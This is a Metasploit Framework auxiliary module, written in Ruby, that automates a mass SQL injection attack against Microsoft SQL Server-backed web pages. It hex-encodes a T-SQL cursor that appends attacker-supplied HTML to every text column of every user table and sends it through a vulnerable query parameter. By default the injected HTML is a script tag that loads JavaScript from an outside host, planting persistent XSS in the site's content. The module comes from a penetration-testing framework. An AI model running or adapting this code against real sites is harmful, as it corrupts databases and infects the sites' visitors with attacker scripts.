##
# $Id: lucky_punch.rb 7075 2009-09-27 21:30:45Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'rex/proto/http'
require 'msf/core'



class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::WMAPScanUniqueQuery
	include Msf::Auxiliary::Scanner


	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'HTTP Microsoft SQL Injection Table XSS Infection',
			'Description'    => %q{
				This module implements the mass SQL injection attack in 
				use lately by concatenation of HTML string that forces a persistant
				XSS attack to redirect user browser to a attacker controller website.
			},
			'Author'         => [ 'et' ],
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 7075 $'))   
			
		register_options(
			[
				OptString.new('URI', [ true,  "The path/file to identify backups", '/index.asp']),
				OptString.new('QUERY', [ true,  "HTTP URI Query", 'p1=v1&p2=v2&p3=v3']),
				OptString.new('VULN_PAR', [ true,  "Vulnerable parameter name", 'p1']),
				OptBool.new('TEXT_INT_INJECTION', [ true,  "Perform string injection", false]),
				OptBool.new('COMMENTED', [ true,  "Comment end of query", true]),
				OptString.new('EVIL_HTML', [ true,  "Evil HTML to add to tables", '<script src=http://browser-autopwn.com/evilscript.js></script>']), 
			], self.class)	
						
	end

	def wmap_enabled
		false
	end		

	def run_host(ip)
			
	#Weird to indent for practical reasons.
infstr = %Q{
DECLARE @T varchar(255),@C varchar(255)
 DECLARE Table_Cursor CURSOR FOR
 select a.name,b.name from sysobjects a,syscolumns b
 where a.id=b.id and a.xtype='u' and (b.xtype=99 or b.xtype=35 or b.xtype=231 or b.xtype=167)
 OPEN Table_Cursor
 FETCH NEXT FROM Table_Cursor INTO @T,@C
 WHILE(@@FETCH_STATUS=0)
 BEGIN
 exec('update ['+@T+'] set ['+@C+']=rtrim(convert(varchar,['+@C+']))+''#{datastore['EVIL_HTML']}''')
 FETCH NEXT FROM Table_Cursor INTO @T,@C
 END
 CLOSE Table_Cursor
 DEALLOCATE Table_Cursor
}.gsub(/(\t|\n|\r)/,"")


		prestr = ";DECLARE @S NVARCHAR(4000);SET @S=CAST("
		poststr = " AS NVARCHAR(4000));EXEC(@S);"
             
        gvars = queryparse(datastore['QUERY']) #Now its a Hash
 
		if gvars.has_key?(datastore['VULN_PAR'])
           
			prestr  = datastore['TEXT_INT_INJECTION'] ? "\'#{prestr}" : nil
			poststr = datastore['COMMENTED'] ? "#{poststr}--" : nil

			attstr = ""          
			infstr.unpack("C*").collect! { |i| attstr += i.to_s(base=16).upcase+"00" } 	
			gvars[datastore['VULN_PAR']] += prestr + "0x"+attstr + poststr
		else 
			print_status("Error: Vulnerable parameter is not part of the supplied query string.")
		return
	end
                 
	begin
		normalres = send_request_cgi({
			'uri'          =>  datastore['URI'],
			'vars_get'     =>  gvars,   
			'method'       => 'GET',
			'ctype'        => 'text/plain'
		}, 20)

	rescue ::Rex::ConnectionError
	rescue ::Errno::EPIPE			
	end
        
	print_status("Request sent.")          
		
	end

end
